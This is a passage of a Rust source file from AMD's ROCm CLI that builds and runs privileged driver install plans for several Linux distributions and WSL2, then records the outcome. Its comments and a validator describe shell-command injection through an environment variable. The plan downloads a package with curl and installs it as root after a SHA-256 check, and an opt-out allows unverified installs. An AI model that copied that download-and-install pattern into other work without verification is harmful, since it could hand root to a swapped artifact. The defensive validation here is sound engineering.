// Copyright © Advanced Micro Devices, Inc., or its affiliates.
//
// SPDX-License-Identifier: MIT

//! `rocm install driver` command handlers and reconciliation.
//!
//! Mechanically relocated from `main.rs` with no behavior change — the
//! `install()` dispatcher's call sites stay byte-identical
//! (`install_driver(...)`/`reconcile_driver_install(...)`, re-imported via
//! `use crate::driver_install::{install_driver, reconcile_driver_install};`).
//! `InstallTarget`/`Cli` remain in the crate root; neither is referenced
//! from this file. Unlike `automations.rs`/`uninstall.rs`, this cluster owns
//! private types (`DriverInstallPlan` and friends), so those moved here too
//! rather than staying in `main.rs`. `DriverInstallResult`/`DriverInstallError`
//! are the exception: they're `pub(crate)` and read from `main.rs`'s
//! `install()` (`result.output`/`result.executed`, `error.source`/`error.executed`).

use std::fmt::Write as _;
use std::fs;
use std::path::PathBuf;
use std::process::{Command as ProcessCommand, Stdio};

use anyhow::{Context, Result, bail};
use rocm_core::{AppPaths, ExamineSummary, shell_command_for_host};
use serde::{Deserialize, Serialize};

use crate::cli_report;
use crate::{empty_as_unknown, parse_os_release_field, read_os_release};

pub(crate) fn install_driver(
    paths: &AppPaths,
    dkms: bool,
    yes: bool,
    dry_run: bool,
) -> std::result::Result<DriverInstallResult, DriverInstallError> {
    let examine =
        ExamineSummary::gather().map_err(|source| DriverInstallError::new(source, false))?;
    let os_release = read_os_release().unwrap_or_default();
    // The only place the real privilege level is read; every builder below takes
    // it as a parameter so both branches stay testable on any host.
    let plan =
        build_driver_install_plan(&examine, &os_release, dkms, PrivilegeEscalation::detect());
    let mut output = render_driver_install_plan(&plan, yes, dry_run);
    if !yes || dry_run || !plan.supported || !plan.mutating {
        return Ok(DriverInstallResult {
            output,
            executed: false,
        });
    }

    let boot_id = current_boot_id();
    let mut state = DriverInstallState {
        approved_at_unix_ms: rocm_core::unix_time_millis(),
        executed_at_unix_ms: None,
        pre_driver: examine.driver,
        post_driver: None,
        boot_id_at_execution: boot_id,
        reboot_required: plan.reboot_required,
        reboot_observed: false,
        commands: plan.execution_commands(),
        reconciled_at_unix_ms: None,
        reconciliation: None,
    };
    write_driver_install_state(paths, &state)
        .map_err(|source| DriverInstallError::new(source, false))?;

    execute_driver_install_plan(
        &plan,
        &mut state,
        run_driver_shell_command,
        |state| write_driver_install_state(paths, state),
        || ExamineSummary::gather().map(|summary| summary.driver),
    )
    .map_err(|source| DriverInstallError::new(source, true))?;

    let report = cli_report::ActionReport::new("driver install completed")
        .detail("reboot_required", plan.reboot_required)
        .detail("state", driver_install_state_path(paths).display());
    output.push_str(&report.render());
    Ok(DriverInstallResult {
        output,
        executed: true,
    })
}

fn execute_driver_install_plan<Run, Persist, Gather>(
    plan: &DriverInstallPlan,
    state: &mut DriverInstallState,
    mut run: Run,
    mut persist: Persist,
    gather_post_driver: Gather,
) -> Result<()>
where
    Run: FnMut(&str) -> Result<()>,
    Persist: FnMut(&DriverInstallState) -> Result<()>,
    Gather: FnOnce() -> Result<rocm_core::DriverSummary>,
{
    for command in &plan.commands {
        if plan.reboot_required && command.phase == DriverCommandPhase::Verify {
            continue;
        }
        run(&command.command)
            .with_context(|| format!("driver command failed: {}", command.command))?;
    }

    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
    state.reboot_required = plan.reboot_required;
    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
    persist(state)?;

    let post_driver = gather_post_driver()?;
    state.post_driver = Some(post_driver);
    persist(state)?;
    Ok(())
}

pub(crate) fn reconcile_driver_install(paths: &AppPaths) -> Result<String> {
    let Some(mut state) = read_driver_install_state(paths)? else {
        let mut output = String::new();
        let _ = writeln!(output, "driver install reconciliation");
        let _ = writeln!(
            output,
            "  state: {}",
            driver_install_state_path(paths).display()
        );
        let _ = writeln!(output, "  approval: not required");
        let _ = writeln!(output, "  privileged_commands: <none>");
        let _ = writeln!(output, "  status: no prior driver execution state found");
        let _ = writeln!(
            output,
            "  action: run `rocm install driver --dkms` to review the native driver plan"
        );
        return Ok(output);
    };
    let examine = ExamineSummary::gather()?;
    let checks = passive_driver_checks();
    reconcile_driver_install_state(paths, &mut state, examine.driver, current_boot_id(), checks)
}

fn reconcile_driver_install_state(
    paths: &AppPaths,
    state: &mut DriverInstallState,
    driver: rocm_core::DriverSummary,
    current_boot_id: Option<String>,
    checks: Vec<DriverPassiveCheck>,
) -> Result<String> {
    let reboot_observed = state
        .boot_id_at_execution
        .as_deref()
        .zip(current_boot_id.as_deref())
        .is_some_and(|(executed, current)| executed != current);
    state.reboot_observed = reboot_observed;
    state.post_driver = Some(driver.clone());
    let at_unix_ms = rocm_core::unix_time_millis();
    state.reconciled_at_unix_ms = Some(at_unix_ms);
    let check_summary = summarize_driver_passive_checks(&checks);
    state.reconciliation = Some(DriverReconciliationState {
        at_unix_ms,
        driver,
        reboot_observed,
        check_summary,
        checks,
    });
    write_driver_install_state(paths, state)?;
    Ok(render_driver_reconciliation(paths, state))
}

fn render_driver_reconciliation(paths: &AppPaths, state: &DriverInstallState) -> String {
    let mut output = String::new();
    let _ = writeln!(output, "driver install reconciliation");
    let _ = writeln!(
        output,
        "  state: {}",
        driver_install_state_path(paths).display()
    );
    let _ = writeln!(output, "  approval: not required");
    let _ = writeln!(output, "  privileged_commands: <none>");
    let _ = writeln!(
        output,
        "  approved_at_unix_ms: {}",
        state.approved_at_unix_ms
    );
    let _ = writeln!(
        output,
        "  executed_at_unix_ms: {}",
        state
            .executed_at_unix_ms
            .map_or_else(|| "<not executed>".to_owned(), |value| value.to_string())
    );
    let _ = writeln!(output, "  reboot_required: {}", state.reboot_required);
    let _ = writeln!(output, "  reboot_observed: {}", state.reboot_observed);
    if let Some(reconciliation) = &state.reconciliation {
        let _ = writeln!(
            output,
            "  reconciled_at_unix_ms: {}",
            reconciliation.at_unix_ms
        );
        let _ = writeln!(output, "  driver_status: {}", reconciliation.driver.status);
        let _ = writeln!(
            output,
            "  driver_detail: {}",
            reconciliation
                .driver
                .detail
                .as_deref()
                .unwrap_or("<unknown>")
        );
        let _ = writeln!(
            output,
            "  passive_check_summary: total={} present={} missing={}",
            reconciliation.check_summary.total,
            reconciliation.check_summary.present,
            reconciliation.check_summary.missing
        );
        if reconciliation.checks.is_empty() {
            let _ = writeln!(output, "  passive_checks: <none for this platform>");
        } else {
            let _ = writeln!(output, "  passive_checks:");
            for check in &reconciliation.checks {
                let _ = writeln!(
                    output,
                    "    {}: {} ({})",
                    check.name, check.status, check.detail
                );
            }
        }
        if state.reboot_required && !state.reboot_observed {
            let _ = writeln!(
                output,
                "  action: reboot is still required before post-install checks are meaningful"
            );
        } else if reconciliation
            .checks
            .iter()
            .any(|check| check.status != "present")
        {
            let _ = writeln!(
                output,
                "  action: reconciliation recorded missing passive checks; run `rocm examine` and inspect driver logs"
            );
        } else {
            let _ = writeln!(
                output,
                "  action: reconciliation complete; run `rocm examine` for the full host summary"
            );
        }
    }
    output
}

fn summarize_driver_passive_checks(checks: &[DriverPassiveCheck]) -> DriverPassiveCheckSummary {
    let total = checks.len();
    let present = checks
        .iter()
        .filter(|check| check.status == "present")
        .count();
    DriverPassiveCheckSummary {
        total,
        present,
        missing: total.saturating_sub(present),
    }
}

fn passive_driver_checks() -> Vec<DriverPassiveCheck> {
    if !rocm_core::runtime_is_linux() {
        return Vec::new();
    }
    vec![
        passive_path_check("/sys/module/amdgpu", "amdgpu kernel module path"),
        passive_path_check("/dev/kfd", "KFD device node"),
        passive_render_node_check(),
    ]
}

fn passive_path_check(path: &str, detail: &str) -> DriverPassiveCheck {
    DriverPassiveCheck {
        name: path.to_owned(),
        status: if rocm_core::host_path(path).exists() {
            "present"
        } else {
            "missing"
        }
        .to_owned(),
        detail: detail.to_owned(),
    }
}

fn passive_render_node_check() -> DriverPassiveCheck {
    let present = fs::read_dir(rocm_core::host_path("/dev/dri"))
        .ok()
        .into_iter()
        .flat_map(|entries| entries.filter_map(std::result::Result::ok))
        .any(|entry| {
            entry
                .file_name()
                .to_str()
                .is_some_and(|name| name.starts_with("renderD"))
        });
    DriverPassiveCheck {
        name: "/dev/dri/renderD*".to_owned(),
        status: if present { "present" } else { "missing" }.to_owned(),
        detail: "DRM render node".to_owned(),
    }
}

pub(crate) struct DriverInstallResult {
    pub(crate) output: String,
    pub(crate) executed: bool,
}

pub(crate) struct DriverInstallError {
    pub(crate) source: anyhow::Error,
    pub(crate) executed: bool,
}

impl DriverInstallError {
    const fn new(source: anyhow::Error, executed: bool) -> Self {
        Self { source, executed }
    }
}

#[derive(Debug, Clone)]
struct DriverInstallPlan {
    supported: bool,
    mutating: bool,
    policy: String,
    os_id: String,
    version_id: String,
    codename: String,
    repo_version: String,
    reason: String,
    preflight_checks: Vec<String>,
    commands: Vec<DriverPlanCommand>,
    checks: Vec<String>,
    /// Whether the host must reboot before the verification steps mean anything.
    ///
    /// True for the kernel-module paths: an amdgpu DKMS build is not live until
    /// the machine comes back up. False on WSL2, where nothing kernel-side
    /// changes — ROCDXG is a userspace library and `ldconfig` publishes it
    /// immediately, so telling the user to reboot would be wrong.
    reboot_required: bool,
}

impl DriverInstallPlan {
    fn execution_commands(&self) -> Vec<String> {
        self.commands
            .iter()
            .filter(|command| {
                matches!(
                    command.phase,
                    DriverCommandPhase::Prepare | DriverCommandPhase::Execute
                )
            })
            .map(|command| command.command.clone())
            .collect()
    }
}

#[derive(Debug, Clone, Copy, Eq, PartialEq)]
enum DriverCommandPhase {
    Prepare,
    Execute,
    Verify,
}

#[derive(Debug, Clone)]
struct DriverPlanCommand {
    phase: DriverCommandPhase,
    command: String,
}

/// How a generated driver command is expected to reach root.
///
/// The driver plan is a list of shell lines, so escalation is a text prefix
/// rather than an argv decision (contrast `openmpi::InstallCommand`, whose
/// commands are argv vectors and can prepend `sudo` structurally). Prefixing
/// unconditionally is what made `install driver` unusable on the hosts it is
/// most needed on: containers and minimal cloud images run as uid 0 with no
/// `sudo` binary, so every command died with `sudo: not found` before any
/// driver work happened.
///
/// This is resolved when the plan is BUILT, not when it runs, so that the plan
/// `--dry-run` prints, the plan the approval prompt shows, and the commands
/// persisted into `state.json` are all the commands that actually execute.
#[derive(Debug, Clone, Copy, Eq, PartialEq)]
enum PrivilegeEscalation {
    /// Not root: privileged commands need a `sudo` prefix.
    Sudo,
    /// Already uid 0: `sudo` is unnecessary, and may not even be installed.
    AlreadyRoot,
}

impl PrivilegeEscalation {
    /// Read the current process's privilege level.
    ///
    /// Only ever called on the production path; every plan builder takes the
    /// escalation as a parameter so both branches are testable on any host.
    fn detect() -> Self {
        if rocm_core::openmpi::running_as_root() {
            Self::AlreadyRoot
        } else {
            Self::Sudo
        }
    }

    /// The prefix to place before a command that must run as root — `"sudo "`,
    /// or nothing at all when the process already is root. Includes the
    /// trailing space so it composes directly into a command string.
    const fn prefix(self) -> &'static str {
        match self {
            Self::Sudo => "sudo ",
            Self::AlreadyRoot => "",
        }
    }

    /// Whether a plan built under this escalation depends on `sudo` being
    /// installed. Drives the preflight list, so it does not claim a
    /// precondition the plan is not relying on.
    const fn needs_sudo_binary(self) -> bool {
        matches!(self, Self::Sudo)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct DriverInstallState {
    approved_at_unix_ms: u128,
    executed_at_unix_ms: Option<u128>,
    pre_driver: rocm_core::DriverSummary,
    post_driver: Option<rocm_core::DriverSummary>,
    boot_id_at_execution: Option<String>,
    reboot_required: bool,
    reboot_observed: bool,
    commands: Vec<String>,
    #[serde(default)]
    reconciled_at_unix_ms: Option<u128>,
    #[serde(default)]
    reconciliation: Option<DriverReconciliationState>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct DriverReconciliationState {
    at_unix_ms: u128,
    driver: rocm_core::DriverSummary,
    reboot_observed: bool,
    #[serde(default)]
    check_summary: DriverPassiveCheckSummary,
    checks: Vec<DriverPassiveCheck>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
struct DriverPassiveCheckSummary {
    total: usize,
    present: usize,
    missing: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct DriverPassiveCheck {
    name: String,
    status: String,
    detail: String,
}

/// Release of ROCDXG installed on WSL2, overridable for trying another build.
///
/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
/// same way `ROCM_CLI_AMDGPU_VERSION` is handled for the bare-metal repository
/// pin. The concrete value is baked into the archive name, the release URL and
/// the `repo_version:` line, so the plan a user reviews names the build the
/// install will actually fetch rather than an unexpanded `${...}` placeholder.
///
/// How the default is chosen: the newest non-prerelease `librocdxg` release
/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
/// is two edits — add the `(version, digest)` row to that table, then change
/// the literal here — and the two must move together: a default with no row
/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
/// the caller supplies a digest, so a bump that forgets the table breaks every
/// default WSL install rather than falling back to the previous release.
///
/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
/// them do not, is not installed here. It is a second prefix under
/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
/// installs an `/etc/profile.d` entry that sources the package's own
/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
/// nor `rocm serve` depends on, and it is not available for every version in
/// the pinned table. Installing it is a separate decision that belongs behind
/// its own opt-in, not folded into the plan whose job is to supply the runtime
/// bridge.
const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";

/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
/// Required when installing a version this build has no digest for.
const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";

/// Opts out of digest verification entirely, when set to an affirmative value.
/// Named explicitly so that shipping an unverified root install is a deliberate
/// act with an audit trail in the plan, rather than what happens when a variable
/// is simply unset.
const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";

/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
/// ROCDXG release, taken from the release host's own asset metadata.
///
/// These exist so the default install is authenticated. The package is fetched
/// over plain HTTPS from a release page and then handed to `apt-get install`,
/// which runs its maintainer scripts as root — so without a digest, TLS to the
/// download host is the only thing standing between a compromised or swapped
/// artifact and root on the user's machine. That is materially weaker than the
/// bare-metal apt path in this same file, which installs from a repository
/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
///
/// A version absent from this table is not installed unless the caller supplies
/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
/// Add the new pair here when pinning a newer release. Nothing in the tree
/// checks a row against the published artifact, so a mistyped digest surfaces
/// only as a failed install on a WSL host — fail-closed, but confusing. Take
/// the value from the release's own asset metadata, or recompute it:
///
/// ```text
/// curl -L --fail \
///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
///   | sha256sum
/// ```
const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
    (
        "1.0.0",
        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
    ),
    (
        "1.1.0",
        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
    ),
    (
        "1.1.1",
        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
    ),
    (
        "1.1.2",
        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
    ),
    (
        "1.2.0",
        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
    ),
    (
        "1.2.1",
        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
    ),
    (
        "1.2.2",
        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
    ),
];

/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
///
/// The driver plan is a list of shell lines run through `sh -c`, and the
/// version is interpolated into three of them — the archive name, the release
/// URL and the local path — each of which is then executed with `sudo` already
/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
/// this unchanged from the environment, so a value containing `;` or a
/// backtick would otherwise end the intended command and start an attacker's
/// own. Restricting it to characters that appear in a Debian package version
/// removes the possibility rather than trying to escape it.
fn rocdxg_version_is_well_formed(version: &str) -> bool {
    !version.is_empty()
        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
        && version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
}

/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
/// form `sha256sum -c -` expects.
fn sha256_digest_is_well_formed(digest: &str) -> bool {
    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
}

/// How the downloaded ROCDXG package will be authenticated before it is
/// installed as root.
#[derive(Debug, Clone, Eq, PartialEq)]
enum RocdxgVerification {
    /// Check the download against this digest and abort the install on a
    /// mismatch.
    Digest(String),
    /// Install without checking, because the caller explicitly asked for it.
    OptedOut,
}

/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
/// no plan can be built.
///
/// Resolution order — an explicit digest wins over the pinned one so a user can
/// install an artifact this build predates without having to disable
/// verification wholesale:
///
/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
///    out. `0` and `false` do not.
///
/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
/// mode of an unset variable is a plan that will not run, not a root install of
/// an unauthenticated package.
fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
        .ok()
        .map(|value| value.trim().to_ascii_lowercase())
        .filter(|value| !value.is_empty())
    {
        if !sha256_digest_is_well_formed(&supplied) {
            return Err(format!(
                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
            ));
        }
        return Ok(RocdxgVerification::Digest(supplied));
    }

    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
        .iter()
        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
    {
        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
    }

    // An allowlist of affirmative values, not "set to anything non-empty":
    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
    // for "off" — would turn digest checking off for a package installed as
    // root. Anything this does not recognise leaves verification on.
    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
        return Ok(RocdxgVerification::OptedOut);
    }

    Err(format!(
        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
    ))
}

/// A WSL plan that cannot be run, carrying the reason in the same shape every
/// other unsupported plan uses so `--dry-run`, the approval prompt and
/// `state.json` all report it identically.
fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
    DriverInstallPlan {
        supported: false,
        mutating: false,
        policy: "wsl_rocdxg".to_owned(),
        os_id: "wsl".to_owned(),
        version_id: String::new(),
        codename: String::new(),
        repo_version,
        reason,
        preflight_checks: Vec::new(),
        commands: Vec::new(),
        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
        reboot_required: false,
    }
}

/// The `rocm install driver` plan for a WSL2 host.
///
/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
/// "no usable AMD GPU detected", even though a gfx target is detected — the
/// target is read from the Windows-side driver.
///
/// This used to be a refusal pointing at a shell script under `scripts/`, which
/// ships only in a git checkout — never in the release bundle — so it was a dead
/// end for anyone who installed the CLI normally. These are that script's steps;
/// it has been removed rather than left as a second, untested copy of them.
fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
    if !rocdxg_version_is_well_formed(&version) {
        return wsl_rocdxg_refusal_plan(
            // The rejected value is still rendered into the plan's
            // `repo_version:` line so the user can see what was refused — but
            // that line is part of a plan a human reads to decide, and a raw
            // value containing a newline could forge further lines in it. The
            // debug form escapes newlines and makes trailing space visible,
            // which is exactly what is wanted for a value being shown as
            // rejected.
            format!("{version:?}"),
            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
        );
    }
    let verification = match resolve_rocdxg_verification(&version) {
        Ok(verification) => verification,
        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
    };

    let sudo = escalation.prefix();
    let deb = format!("rocdxg-roct_{version}_amd64.deb");
    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
    let deb_path = format!("/tmp/{deb}");
    // `version` is validated above and the digest is hex, so neither can carry
    // shell metacharacters; the quotes keep that guarantee local to the command
    // rather than resting on a check several functions away.
    let verify_download = match &verification {
        RocdxgVerification::Digest(digest) => driver_command(
            DriverCommandPhase::Execute,
            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
        ),
        RocdxgVerification::OptedOut => driver_command(
            DriverCommandPhase::Execute,
            &format!(
                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
            ),
        ),
    };
    DriverInstallPlan {
        supported: true,
        mutating: true,
        policy: "wsl_rocdxg".to_owned(),
        os_id: "wsl".to_owned(),
        version_id: String::new(),
        codename: String::new(),
        repo_version: version,
        reason:
            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
                .to_owned(),
        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
        // is absent the fix is on the Windows side and no Linux package helps.
        // The Execute phase fails on the same two paths rather than installing
        // a library with nothing to bind to.
        preflight_checks: {
            let mut checks = vec![
                "/dev/dxg (WSL GPU device)".to_owned(),
                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
            ];
            checks.extend(driver_root_preflight_checks(escalation));
            checks
        },
        commands: vec![
            driver_command(
                DriverCommandPhase::Prepare,
                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
            ),
            // Say why up front rather than letting the first privileged step die
            // with `sudo: command not found`, which reads like a broken plan.
            // Skipped when already root: the plan emits no `sudo` at all then,
            // so demanding the binary would state a precondition it is not
            // relying on.
            driver_command(
                DriverCommandPhase::Prepare,
                if escalation.needs_sudo_binary() {
                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
                } else {
                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
                },
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get update"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get install -y ca-certificates curl"),
            ),
            driver_command(
                DriverCommandPhase::Execute,
                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
            ),
            // Authenticating the download is the whole trust anchor for this
            // plan: everything after it runs the package's maintainer scripts
            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
            // aborts the plan before the install step.
            verify_download,
            driver_command(
                DriverCommandPhase::Execute,
                &format!("{sudo}apt-get install -y '{deb_path}'"),
            ),
            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
            driver_command(
                DriverCommandPhase::Verify,
                "test -e /opt/rocm/lib/librocdxg.so",
            ),
            driver_command(
                DriverCommandPhase::Verify,
                "ldconfig -p | grep -q 'librocdxg\\.so'",
            ),
        ],
        // `rocm diagnose` carries the WSL catalog, including the host-side
        // form that inspects a distro over `wsl.exe` without needing anything
        // installed inside it.
        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
        // Userspace only: `ldconfig` publishes the library in this boot.
        reboot_required: false,
    }
}

fn build_driver_install_plan(
    examine: &ExamineSummary,
    os_release_text: &str,
    dkms: bool,
    escalation: PrivilegeEscalation,
) -> DriverInstallPlan {
    // Resolve the AMD graphics version and amdgpu-install package release once,
    // here at plan-build time, so the concrete values are baked into both the
    // human-readable summary and every command the plan runs. Keeping shell
    // `${VAR:-default}` templates in the commands used to be load-bearing, but
    // AMD's apt `sources.list` line embeds the template inside POSIX single
    // quotes, which suppress all expansion — so the literal `${...}` would land
    // in the repo file. Resolving up front fixes that and keeps the summary and
    // the executed commands in agreement.
    let repo_version = resolve_shell_default_template("${ROCM_CLI_AMDGPU_VERSION:-7.2.4}");
    let package_release =
        resolve_shell_default_template("${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}");
    if examine.os == "windows" {
        return DriverInstallPlan {
            supported: false,
            mutating: false,
            policy: "windows_validate_only".to_owned(),
            os_id: "windows".to_owned(),
            version_id: String::new(),
            codename: String::new(),
            repo_version,
            reason: "Windows driver install is validate-only in rocm-cli; use `rocm examine` to inspect the AMD display driver.".to_owned(),
            preflight_checks: Vec::new(),
            commands: Vec::new(),
            checks: vec!["rocm examine".to_owned()],
            reboot_required: true,
        };
    }
    if examine.wsl.as_ref().is_some_and(|wsl| wsl.is_wsl) {
        return wsl_rocdxg_driver_plan(escalation);
    }

    let os_id = parse_os_release_field(os_release_text, "ID").unwrap_or_default();
    let version_id = parse_os_release_field(os_release_text, "VERSION_ID").unwrap_or_default();
    let codename = parse_os_release_field(os_release_text, "VERSION_CODENAME")
        .or_else(|| parse_os_release_field(os_release_text, "UBUNTU_CODENAME"))
        .or_else(|| codename_for_version(&os_id, &version_id).map(str::to_owned))
        .unwrap_or_default();
    let id_like = parse_os_release_field(os_release_text, "ID_LIKE").unwrap_or_default();

    match (os_id.as_str(), version_id.as_str()) {
        ("ubuntu", "22.04" | "24.04") => apt_driver_plan(
            os_id,
            version_id,
            codename,
            repo_version,
            dkms,
            true,
            escalation,
        ),
        ("debian", "12" | "13") => {
            let repo_codename = if version_id == "13" { "noble" } else { "jammy" };
            let mut plan = apt_driver_plan(
                os_id,
                version_id,
                repo_codename.to_owned(),
                repo_version,
                dkms,
                false,
                escalation,
            );
            // Debian deliberately reuses AMD's Ubuntu-suite repository: AMD's
            // documented Debian install maps Debian 12 -> jammy and 13 -> noble
            // and serves them from the .../ubuntu graphics tree. Surface that in
            // the plan so the Ubuntu codename on a Debian host doesn't read as a
            // misdetection.
            plan.reason = format!(
                "Debian intentionally uses AMD's Ubuntu-suite repository (codename {repo_codename}), per AMD's documented Debian install; the Ubuntu codename is deliberate, not a misdetection. {}",
                plan.reason
            );
            plan
        }
        ("rhel", "10.1" | "10.0" | "9.7" | "9.6" | "9.4" | "8.10") => dnf_driver_plan(
            os_id,
            version_id,
            codename,
            repo_version,
            package_release,
            dkms,
            DnfDriverDistro::Rhel,
            escalation,
        ),
        ("ol", "10.1" | "9.7" | "8.10") => dnf_driver_plan(
            os_id,
            version_id,
            codename,
            repo_version,
            package_release,
            dkms,
            DnfDriverDistro::Oracle,
            escalation,
        ),
        ("rocky", "9.4" | "9.6" | "9.7") => dnf_driver_plan(
            os_id,
            version_id,
            codename,
            repo_version,
            package_release,
            dkms,
            DnfDriverDistro::Rocky,
            escalation,
        ),
        ("sles" | "sle", "15.7") => {
            sles_driver_plan(
                os_id,
                version_id,
                codename,
                repo_version,
                package_release,
                dkms,
                escalation,
            )
        }
        _ => driver_plan_via_id_like(
            &os_id,
            &version_id,
            &id_like,
            &codename,
            &repo_version,
            &package_release,
            dkms,
            escalation,
        )
        .unwrap_or_else(|| DriverInstallPlan {
            supported: false,
            mutating: false,
            policy: "unsupported_linux_dkms_plan".to_owned(),
            os_id,
            version_id,
            codename,
            repo_version,
            reason: "Linux DKMS driver install is currently planned only for AMD-documented Ubuntu, Debian, RHEL, Oracle Linux, SLES, and Rocky versions; no commands were guessed for this distro.".to_owned(),
            preflight_checks: Vec::new(),
            commands: Vec::new(),
            checks: vec!["rocm examine".to_owned()],
            // Kernel module: not live until the machine comes back up.
            reboot_required: true,
        }),
    }
}

/// Select a driver install plan for a distro whose `/etc/os-release` `ID` is not
/// an AMD-documented distro, by falling back to its `ID_LIKE` base family.
///
/// This mirrors the family resolution already used by the OpenMPI and system
/// dependency install plans in [`rocm_core::openmpi`], which honor `ID_LIKE`. A
/// derivative is matched only when its `VERSION_ID` aligns with an AMD-documented
/// version of the base family, so version-misaligned derivatives still fall
/// through to the unsupported plan rather than fabricating a repository URL that
/// would 404.
// Every parameter is one already-resolved fact the plan is templated from;
// bundling them into a struct would only move the same list one level out.
#[allow(clippy::too_many_arguments)]
fn driver_plan_via_id_like(
    os_id: &str,
    version_id: &str,
    id_like: &str,
    codename: &str,
